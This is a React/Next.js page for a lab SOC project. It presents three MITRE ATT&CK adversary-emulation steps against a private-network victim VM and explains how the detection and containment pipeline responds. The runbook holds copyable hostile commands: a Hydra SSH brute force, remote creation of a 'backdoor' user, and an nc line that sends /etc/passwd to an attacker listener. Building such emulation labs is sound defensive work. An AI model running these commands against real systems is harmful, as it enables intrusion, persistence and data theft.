"use client";

import React, { useState } from "react";
import Link from "next/link";
import { 
  Terminal, 
  ShieldCheck,
  Copy,
} from "lucide-react";

export default function AttacksPage() {
  const [activeAct, setActiveAct] = useState<number>(1);
  const [copiedIndex, setCopiedIndex] = useState<number | null>(null);
  const [toastMessage, setToastMessage] = useState<string | null>(null);

  const showToast = (msg: string) => {
    setToastMessage(msg);
    setTimeout(() => setToastMessage(null), 3000);
  };

  const handleCopy = (text: string, index: number) => {
    navigator.clipboard.writeText(text);
    setCopiedIndex(index);
    showToast("Command copied to clipboard!");
    setTimeout(() => setCopiedIndex(null), 2000);
  };

  const attackActs = [
    {
      act: 1,
      code: "T1110",
      tactic: "CREDENTIAL ACCESS",
      name: "SSH Password Spray / Brute Force",
      desc: "Hydra attacks victim SSH port 22 until credentials match. Generates 5+ ssh_fail events followed by 1 ssh_success in /var/log/auth.log.",
      command: "hydra -l admin -P wordlist.txt ssh://192.168.56.10",
      rule: "R1 (Brute-Force Detection)",
      color: "rose"
    },
    {
      act: 2,
      code: "T1136",
      tactic: "PERSISTENCE",
      name: "Unauthorized Backdoor Account Creation",
      desc: "Attacker establishes persistence by creating an unprivileged user named 'backdoor', intercepted immediately by kernel auditd and useradd.",
      command: "ssh admin@192.168.56.10 'sudo useradd -m -s /bin/bash backdoor'",
      rule: "R2 (Post-Compromise User Creation)",
      color: "purple"
    },
    {
      act: 3,
      code: "T1041",
      tactic: "EXFILTRATION",
      name: "Command & Control Egress Channel",
      desc: "Victim connects outbound on port 4444 to the attacker listener. Intercepted by Linux UFW egress audit logging.",
      command: "nc -nv 192.168.56.20 4444 < /etc/passwd",
      rule: "R3 (C2 Beacon / Egress Detection)",
      color: "red"
    }
  ];

  return (
    <div className="mx-auto max-w-6xl px-4 sm:px-6 lg:px-8 py-8 sm:py-12 space-y-8">
      {toastMessage && (
        <div className="fixed bottom-6 right-6 z-50">
          <div className="flex items-center space-x-2.5 px-5 py-3 text-xs font-mono rounded-full bg-[var(--bg-surface)] border border-[var(--border-card)] text-[var(--text-primary)] shadow-2xl animate-in slide-in-from-bottom-3">
            <span className="h-1.5 w-1.5 rounded-full bg-emerald-500 animate-pulse"></span>
            <span>{toastMessage}</span>
          </div>
        </div>
      )}

      {/* Header */}
      <div className="flex flex-col sm:flex-row sm:items-center justify-between pb-6 border-b border-[var(--border-hairline)] gap-4">
        <div>
          <div className="flex items-center space-x-2 text-xs font-mono text-[var(--text-muted)]">
            <span className="uppercase tracking-widest text-[var(--text-secondary)] font-semibold">
              LIVE VM ENVIRONMENT
            </span>
            <span>&bull;</span>
            <span className="text-cyan-600 dark:text-cyan-400">MITRE ATT&CK Matrix</span>
          </div>
          <h2 className="mt-2 text-2xl sm:text-3xl font-bold tracking-tight text-[var(--text-primary)]">
            Adversary Emulation Laboratory
          </h2>
          <p className="text-xs sm:text-sm text-[var(--text-secondary)] mt-1.5 max-w-2xl leading-relaxed">
            Execute the three acts of compromise from the Attacker VM (192.168.56.20) against the Ubuntu Victim (192.168.56.10). 
            Live logs are streamed in real time to the autonomous SOC daemon and synthesized via LLM.
          </p>
        </div>

        <Link
          href="/admin"
          className="btn-metallic-primary h-10 px-4 rounded-lg flex items-center space-x-2 text-xs font-medium cursor-pointer shrink-0"
        >
          <ShieldCheck className="h-4 w-4 text-emerald-400" />
          <span>View Live Console</span>
        </Link>
      </div>

      {/* Network Nodes Banner */}
      <div className="grid grid-cols-1 md:grid-cols-3 gap-4 font-mono text-xs">
        <div className="metallic-card rounded-xl p-4 border border-[var(--border-card)] space-y-1">
          <div className="text-[10px] text-[var(--text-muted)] uppercase">Attacker Machine</div>
          <div className="font-bold text-[var(--text-primary)] flex items-center space-x-2">
            <span className="h-2 w-2 rounded-full bg-rose-500"></span>
            <span>192.168.56.20 (Kali / Hydra / Caldera)</span>
          </div>
        </div>
        <div className="metallic-card rounded-xl p-4 border border-[var(--border-card)] space-y-1">
          <div className="text-[10px] text-[var(--text-muted)] uppercase">Victim Server</div>
          <div className="font-bold text-[var(--text-primary)] flex items-center space-x-2">
            <span className="h-2 w-2 rounded-full bg-blue-500"></span>
            <span>192.168.56.10 (Ubuntu 24.04 Server)</span>
          </div>
        </div>
        <div className="metallic-card rounded-xl p-4 border border-[var(--border-card)] space-y-1">
          <div className="text-[10px] text-[var(--text-muted)] uppercase">SOC Daemon & LLM Brain</div>
          <div className="font-bold text-[var(--text-primary)] flex items-center space-x-2">
            <span className="h-2 w-2 rounded-full bg-emerald-500"></span>
            <span>192.168.56.1:8000 (Host Laptop)</span>
          </div>
        </div>
      </div>

      {/* 3-Act Attack Cards Grid */}
      <div className="grid grid-cols-1 md:grid-cols-3 gap-4 sm:gap-6">
        {attackActs.map((act) => (
          <div 
            key={act.act}
            onClick={() => setActiveAct(act.act)}
            className={`metallic-card rounded-2xl p-5 sm:p-6 space-y-4 border transition-all cursor-pointer ${
              activeAct === act.act 
                ? "border-blue-500 shadow-lg ring-1 ring-blue-500/30" 
                : "border-[var(--border-card)] hover:border-slate-300"
            }`}
          >
            <div className="flex items-center justify-between">
              <span className="text-[10px] font-mono font-bold text-[var(--text-muted)]">ACT 0{act.act} &bull; {act.code}</span>
              <span className="px-2.5 py-0.5 rounded-full text-[10px] font-mono font-semibold text-rose-600 dark:text-rose-300 bg-rose-500/10 border border-rose-500/30">
                {act.tactic}
              </span>
            </div>
            <h3 className="text-sm font-bold text-[var(--text-primary)]">
              {act.name}
            </h3>
            <p className="text-xs text-[var(--text-secondary)] leading-relaxed">
              {act.desc}
            </p>
            <div className="pt-2 text-[11px] font-mono text-[var(--text-muted)]">
              Correlates to: <strong className="text-[var(--text-primary)]">{act.rule}</strong>
            </div>
          </div>
        ))}
      </div>

      {/* Command Runner Snippet */}
      <div className="metallic-surface rounded-2xl p-5 sm:p-7 space-y-4 border border-[var(--border-card)]">
        <div className="flex items-center justify-between pb-3 border-b border-[var(--border-hairline)]">
          <div className="flex items-center space-x-2 text-xs font-mono text-[var(--text-primary)] font-bold">
            <Terminal className="h-4 w-4 text-cyan-500" />
            <span>ATTACK EXECUTION RUNBOOK (RUN ON ATTACKER VM: 192.168.56.20)</span>
          </div>
          <span className="text-[11px] font-mono text-[var(--text-muted)]">Target: 192.168.56.10</span>
        </div>

        <div className="space-y-3">
          {attackActs.map((act) => (
            <div key={act.act} className="p-3 rounded-xl bg-black/95 border border-white/10 space-y-1.5 font-mono text-xs">
              <div className="flex items-center justify-between text-slate-400 text-[11px]">
                <span className="text-cyan-400 font-bold">Act 0{act.act}: {act.name}</span>
                <button
                  onClick={() => handleCopy(act.command, act.act)}
                  className="hover:text-white flex items-center space-x-1 cursor-pointer"
                  title="Copy command"
                >
                  <Copy className="h-3 w-3" />
                  <span>{copiedIndex === act.act ? "Copied" : "Copy"}</span>
                </button>
              </div>
              <div className="text-emerald-400 font-semibold select-all">
                $ {act.command}
              </div>
            </div>
          ))}
        </div>
      </div>

      {/* Caldera Verification Integration Notice */}
      <div className="metallic-card rounded-2xl p-5 sm:p-7 space-y-3 border border-[var(--border-card)]">
        <div className="text-[11px] font-mono text-cyan-600 dark:text-cyan-400 uppercase tracking-widest font-bold">
          AUTONOMOUS VERIFICATION PIPELINE
        </div>
        <h3 className="text-sm font-bold text-[var(--text-primary)]">
          Live Victim Log Stream & Proof
        </h3>
        <p className="text-xs text-[var(--text-secondary)] leading-relaxed">
          1. The real-time log shipper running on the victim VM streams events from <code className="font-mono text-[var(--text-primary)]">/var/log/auth.log</code> and <code className="font-mono text-[var(--text-primary)]">/var/log/ufw.log</code> to the backend at <code className="font-mono text-[var(--text-primary)]">http://192.168.56.1:8000/events</code>.<br/>
          2. The SOC backend correlates the incoming events into a High Severity incident and calls OpenAI to generate a clear 3-sentence non-technical advisory.<br/>
          3. Once the Administrator approves the containment action, the backend issues an SSH firewall rule (<code className="font-mono text-[var(--text-primary)]">sudo ufw deny from 192.168.56.20</code>) on the victim and re-runs Caldera to verify mathematical non-repudiation.
        </p>
      </div>
    </div>
  );
}
